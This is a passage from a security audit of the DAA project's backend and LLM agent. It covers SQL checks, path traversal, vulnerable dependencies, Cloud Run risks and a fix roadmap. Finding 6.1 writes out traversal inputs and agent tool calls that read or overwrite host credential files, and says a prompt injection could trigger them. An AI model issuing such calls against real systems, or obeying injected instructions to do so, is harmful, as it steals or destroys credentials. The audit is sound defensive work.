     if auth_url.startswith("-") or branch_name.startswith("-"):
         raise ValueError("Invalid git URL or branch parameter leading with option flag '-'")
     ```

---

#### Finding 5.3: SQL Injection Guardrail Verification (ORM vs Dynamic Query Practices)
* **Severity:** **Low / Informational**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/incidents.py#L126-L131`, `file:///home/rutvej/Desktop/DAA/app/backend-api/src/routers/applications.py#L85-L89`
* **Code Evidence:**
  ```python
  # app/backend-api/src/routers/incidents.py lines 126-131:
  query = db.query(DBIncident)
  if status:
      query = query.filter(DBIncident.status == status)
  if app_name:
      query = query.filter(DBIncident.app_name == app_name)
  incidents = query.order_by(DBIncident.last_seen_at.desc()).all()
  ```
* **Impact Analysis:**
  A systematic check across all SQL query execution points in `app/backend-api/src/` verified that all queries strictly utilize SQLAlchemy ORM (`db.query(Model).filter(Model.field == value)`). There are no instances of raw string interpolation (`f"SELECT ... WHERE id = '{id}'"`) or unparametrized `text()` execution (`db.execute()`).
* **Remediation Steps:**
  Maintain strict enforcement of SQLAlchemy ORM query construction across all future endpoints. If raw queries using `text()` are required in future features, ensure parameters are explicitly bound using dictionary parameters (`db.execute(text("SELECT * FROM logs WHERE app_name = :app"), {"app": app_name})`).

---

### Category 6: Path Traversal & Unsafe File Access

#### Finding 6.1: Arbitrary File Reading & Writing via Unchecked `get_full_path` Traversal (`file_system_tool.py` and `code_nav_tool.py`)
* **Severity:** **Critical**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/file_system_tool.py#L43-L53` and `file:///home/rutvej/Desktop/DAA/app/python-agent/agent_src/tools/code_nav_tool.py#L51-L55`
* **Code Evidence:**
  ```python
  # app/python-agent/agent_src/tools/file_system_tool.py lines 43-53:
  def get_full_path(file_path: str) -> str:
      """Returns the full path of a file."""
      file_path = file_path.strip().strip("'\"")
      if file_path.startswith("/tmp") or file_path.startswith("/home"):
          return file_path              # <--- No check for '..' or boundary restrictions!
      if os.path.isabs(file_path):
          if file_path.startswith(ROOT_DIR):
              return file_path
          return os.path.join(ROOT_DIR, file_path[1:])
      return os.path.join(ROOT_DIR, file_path)
  ```
  And applied across:
  * `read_file(file_path)` / `write_file(data)` / `list_files(path)` (`file_system_tool.py`)
  * `view_file_slice(data)` / `grep_search(data)` / `find_symbol(data)` / `read_repomap(data)` (`code_nav_tool.py`)
  * `check_recent_changes(data)` (`change_tracker_tool.py`)
* **Impact Analysis:**
  `get_full_path` allows any file path starting with `/tmp` or `/home` directly (`return file_path`), and performs zero canonicalization (`os.path.abspath`) to resolve directory traversal (`..`) sequences. Because `docker-compose.yml` mounts sensitive host files into `python-agent` (`/home/rutvej/snap/codex/34/auth.json`, `/home/rutvej/.gemini`, `/usr/local/bin/agy`), an LLM agent tool call (or prompt injection payload) can invoke:
  * `read_file("/home/rutvej/snap/codex/34/auth.json")` -> Extracts host Codex/Git tokens.
  * `read_file("/app/../../etc/passwd")` or `view_file_slice('{"file_path": "/home/rutvej/.gemini/.../session.json"}')` -> Exfiltrates sensitive host session logs.
  * `write_file('{"file_path": "/home/rutvej/snap/codex/34/auth.json", "content": "..."}')` -> Overwrites host credentials.
* **Remediation Steps:**
  Strictly sandbox file access to `ROOT_DIR` (`/app`) and `/tmp/daa` (or `/tmp/{app_name}` workspaces). Use `os.path.abspath` and `os.path.realpath` (to resolve symlinks), and verify that the canonical path resides inside allowed base directories before permitting open/read/write operations:
  ```python
  def get_full_path(file_path: str) -> str:
      file_path = file_path.strip().strip("'\"")
      if not os.path.isabs(file_path):
          candidate = os.path.join(ROOT_DIR, file_path)
      else:
          candidate = file_path
      canonical = os.path.realpath(candidate)
      allowed_bases = [os.path.realpath(ROOT_DIR), os.path.realpath("/tmp")]
      if not any(canonical == base or canonical.startswith(base + os.sep) for base in allowed_bases):
          raise PermissionError(f"Access denied: Path '{file_path}' traverses outside allowed sandbox directories ({allowed_bases}).")
      return canonical
  ```

---

### Category 7: Dependency Risks

#### Finding 7.1: Outdated Dependencies with Known Critical RCE & Security CVEs (`GitPython==3.1.24`, `requests==2.26.0`, `urllib3==1.26.18`)
* **Severity:** **High**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/python-agent/requirements.txt#L1-L3` and `file:///home/rutvej/Desktop/DAA/requirements.txt#L13`
* **Code Evidence:**
  ```
  # app/python-agent/requirements.txt lines 1-3:
  requests==2.26.0
  urllib3==1.26.18
  GitPython==3.1.24

  # root requirements.txt line 13:
  GitPython==3.1.24
  ```
* **Impact Analysis:**
  * **`GitPython==3.1.24` (Released 2021)**: Contains known critical vulnerabilities, including **CVE-2022-24439** (Remote Code Execution via option injection during `git.Repo.clone_from` when cloning untrusted repositories), **CVE-2023-40590** (blind execution of untrusted git hooks/config when cloning), and **CVE-2024-22190**. When combined with `clone_repo` in `git_tool.py` (`Repo.clone_from(repo_url, temp_dir)`), attackers can achieve RCE by supplying malicious Git URLs.
  * **`requests==2.26.0` & `urllib3==1.26.18` (Released 2021/2023)**: Vulnerable to **CVE-2023-45803** (leaking `Authorization` headers or sensitive tokens on cross-origin HTTP redirects) and TLS/header parsing vulnerabilities.
* **Remediation Steps:**
  Upgrade dependencies across all `requirements.txt` files immediately to current patched releases:
  ```diff
  - requests==2.26.0
  - urllib3==1.26.18
  - GitPython==3.1.24
  + requests>=2.32.3
  + urllib3>=2.2.2
  + GitPython>=3.1.43
  ```

---

#### Finding 7.2: Unpinned Python Package Dependencies (`fastapi`, `uvicorn`, `SQLAlchemy`, etc.)
* **Severity:** **Medium**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/requirements.txt#L1-L12` and `file:///home/rutvej/Desktop/DAA/app/backend-api/requirements.txt#L1-L12`
* **Code Evidence:**
  ```
  # requirements.txt lines 1-12:
  fastapi
  uvicorn
  psycopg2-binary
  SQLAlchemy
  pika
  passlib
  python-jose
  pytest
  httpx
  PyJWT
  requests
  ```
* **Impact Analysis:**
  Unpinned dependencies across root and `backend-api` requirement files mean container builds (`docker-compose build`) pull whatever major/minor versions are currently published on PyPI at build time. This introduces high risk of non-deterministic builds, breaking changes across SQLAlchemy 2.x or Pydantic v2 incompatibilities, and exposure to dependency confusion or supply-chain compromise if a compromised release is published upstream.
* **Remediation Steps:**
  Pin all package versions to specific, tested patch versions and generate lockfiles (`pip-compile` / `uv pip compile requirements.in -o requirements.txt` with hashes) across the entire project.

---

### Category 8: Cloud Run & K8s Security

#### Finding 8.1: SQLite WAL Mode Incompatibility and Database Locking/Corruption on Cloud Run (`database.py`)
* **Severity:** **High**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/database.py#L140-L166`
* **Code Evidence:**
  ```python
  # app/backend-api/src/database.py lines 140-166:
  elif DAA_DB_PROVIDER == "sqlite":
      if "K_SERVICE" in os.environ:
          logging.warning(
              "SQLite is fundamentally incompatible with bucket-mounted storage (GCS FUSE) "
              "due to lack of advisory POSIX locking and mmap support. This will cause "
              "database corruption or lock errors on Cloud Run..."
          )
      DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///./daa.db")
      engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False, "timeout": 30.0})
      if "K_SERVICE" not in os.environ:
          @event.listens_for(engine, "connect")
          def set_sqlite_pragma(dbapi_connection, connection_record):
              cursor = dbapi_connection.cursor()
              cursor.execute("PRAGMA journal_mode=WAL")
              cursor.close()
  ```
* **Impact Analysis:**
  Although `database.py` logs a warning when `K_SERVICE` (Google Cloud Run environment variable) is present, it proceeds to initialize `sqlite:///./daa.db` and explicitly skips `PRAGMA journal_mode=WAL`.
  1. **Split-Brain Data Loss on Local Ephemeral Disk**: If `DATABASE_URL` points to `./daa.db` on Cloud Run or Kubernetes without shared volume storage, every horizontal container instance writes to its own isolated in-memory/ephemeral disk (`/app/daa.db`). Data written to Instance A is invisible to Instance B and is permanently erased when the request container spins down.
  2. **Database Corruption / `SQLITE_BUSY` Crashes on Cloud Storage FUSE**: If `./daa.db` is backed by Cloud Storage FUSE (`gcsfuse`) or NFS to persist data across instances, SQLite without WAL mode and without advisory POSIX file locking/mmap support will frequently encounter fatal `SQLITE_BUSY` locking errors and permanent database corruption under concurrent write traffic.
* **Remediation Steps:**
  If `K_SERVICE` is present or `DAA_ENV == "production"` while `DAA_DB_PROVIDER == "sqlite"`, do not merely log a warning. Raise a startup exception preventing SQLite usage in request-scoped multi-instance serverless environments, mandating `DAA_DB_PROVIDER=postgres` (`external-postgres`) or libSQL/Turso:
  ```python
  if "K_SERVICE" in os.environ and DAA_DB_PROVIDER == "sqlite":
      raise RuntimeError(
          "Fatal Cloud Run Configuration Error: DAA_DB_PROVIDER=sqlite is prohibited on Google Cloud Run due to "
          "ephemeral filesystem split-brain data loss and GCS FUSE mmap lock corruption. "
          "Please configure DAA_DB_PROVIDER=external-postgres with Cloud SQL."
      )
  ```

---

#### Finding 8.2: RabbitMQ Background Worker Suspend Risk on Cloud Run Request-Scoped Containers
* **Severity:** **Medium**
* **Vulnerable Files:** `file:///home/rutvej/Desktop/DAA/app/backend-api/src/main.py#L44-L53` and `file:///home/rutvej/Desktop/DAA/entrypoint.sh#L49-L57`
* **Code Evidence:**
  ```python
  # app/backend-api/src/main.py lines 44-53:
  if os.environ.get("DAA_QUEUE_MODE", "rabbitmq").lower() == "rabbitmq" and "K_SERVICE" in os.environ:
      raise RuntimeError("Invalid configuration: DAA_QUEUE_MODE=rabbitmq is not supported on Google Cloud Run...")
  ```
  ```bash
  # entrypoint.sh lines 54-56:
  echo "Starting DAA Agent Worker..."
  python -m agent_src.main &
  exec uvicorn src.main:app --host 0.0.0.0 --port "$PORT" --app-dir /app/app/backend-api
  ```
* **Impact Analysis:**
  While `main.py` blocks `DAA_QUEUE_MODE=rabbitmq` inside the API container when `K_SERVICE` is set, `entrypoint.sh` starts `python -m agent_src.main &` inside the same container when running single-image deployment in distributed mode. On Cloud Run (unless CPU allocation is explicitly configured as `always-on` via `--no-cpu-throttling`), container CPU execution is completely frozen as soon as an HTTP request completes (`uvicorn`). When CPU freezes between requests, background worker threads (`agent_src.main` or `BackgroundTasks`) processing long-running remediation tasks (`process_job`) will be abruptly suspended mid-execution, causing RabbitMQ connection timeouts (`HeartbeatMissed`), dropped locks, and partial/corrupted Git repository cloning or PR submissions.
* **Remediation Steps:**
  Ensure deployment documentation (`DEPLOYMENT.md`) and deployment manifests explicitly enforce `CPU allocation: CPU is always allocated` on Cloud Run when running background workers. Alternatively, separate the API service (`backend-api`) and background worker (`python-agent`) into distinct Kubernetes/Cloud Run deployments or Cloud Tasks/Cloud Run Jobs triggered via webhook endpoints.

---

## 4. Remediation Priority & Architectural Roadmap

To systematically harden the `/home/rutvej/Desktop/DAA` repository, remediation must proceed across three distinct phases:

### Phase 1: Immediate Hotfixes (Critical & High Severity — Day 1)
1. **Sanitize Docker Volume Mounts**: Immediately remove `- /var/run/docker.sock`, `- ${CODEX_AUTH_JSON_PATH}:/app/auth.json`, `- /home/rutvej/.gemini:/root/.gemini`, and `- /home/rutvej/.local/bin/agy:/usr/local/bin/agy` from `docker-compose.yml`.
2. **Revoke and Rotate Hardcoded Secrets**: Revoke `GEMINI_API_KEY=AQ.Ab8RN...`, `DAA_GIT_TOKEN=82faa266...`, and `95a2c8bc...` across all developer `.env` and `.env.daa` files.
3. **Patch Command & Shell Injections**: Replace `shell=True` in `execution_tool.py` (`run_tests`) and `daa` CLI with strict token lists (`shell=False`, `shlex.split`), and prefix all `git ls-remote` arguments with `--` separator (`["git", "ls-remote", "--heads", "--", auth_url, ...`).
4. **Fix Path Traversal**: Enforce `os.path.realpath` boundary canonicalization inside `get_full_path` (`file_system_tool.py`), strictly rejecting any path outside `/app` and `/tmp`.
5. **Eliminate Synthetic `admin-id` Privilege Escalation**: Modify `auth.py` so that `not DAA_AUTH_ENABLED` returns `"role": "readonly"`. Require valid API keys or Sentry HMAC signatures for `POST /api/v1/self-report` and `/ingest/*` routes unconditionally.

### Phase 2: Core Dependency & Default Hardening (Week 1)
1. **Upgrade Vulnerable Libraries**: Upgrade `GitPython>=3.1.43`, `requests>=2.32.3`, and `urllib3>=2.2.2` across `requirements.txt` and `app/python-agent/requirements.txt` to eliminate critical RCE vulnerabilities (`CVE-2022-24439`).
2. **Restrict CORS & JWT Secrets**: Replace wide subnet regex `r"^https?://(192\.168\.\d{1,3}\.\d{1,3})"` with explicit origin whitelists. Enforce startup verification preventing `SECRET_KEY = "a_secret_key"` or `"demo_secret_key"`.
3. **Handle `MockSession` Mode Correctly**: Ensure API endpoints return `HTTP 503` when database writes are attempted in `DAA_DB_PROVIDER=none` mode instead of silently discarding data.
4. **Enforce Non-Root Containers**: Add `USER appuser` to `Dockerfile`, `backend-api/Dockerfile`, `python-agent/Dockerfile`, and `admin-panel/Dockerfile`.

### Phase 3: Cloud Native SRE Resilience (Week 2)
1. **Cloud Run SQLite Enforcement**: Abort startup if `DAA_DB_PROVIDER=sqlite` is detected alongside `K_SERVICE`, mandating `external-postgres` (`Cloud SQL`).
2. **Mask API Response Tokens**: Update `ProjectConnectionResponse` (`GET /projects`) to mask `repo_token` and `jira_token` before returning over the network.
3. **Enforce Application Ownership Authorization**: Verify `current_user["username"] == application.team_owner` on `PATCH /incidents/{id}` and `POST /fixes/{id}/approve`.
